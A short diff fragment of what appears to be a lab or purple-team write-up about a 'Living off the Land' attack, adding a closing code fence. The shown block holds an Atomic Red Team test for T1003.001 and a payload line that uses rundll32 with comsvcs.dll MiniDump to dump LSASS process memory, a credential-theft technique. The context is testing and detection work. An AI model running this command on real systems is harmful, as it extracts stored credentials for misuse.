@@ -36,6 +36,7 @@ I executed a "Living off the Land" attack using legitimate Windows binaries to d
 ```powershell
 Invoke-AtomicTest T1003.001 -TestNumbers 2
 # Payload: rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass_pid> dump.dmp full
+```
 
 ---
 
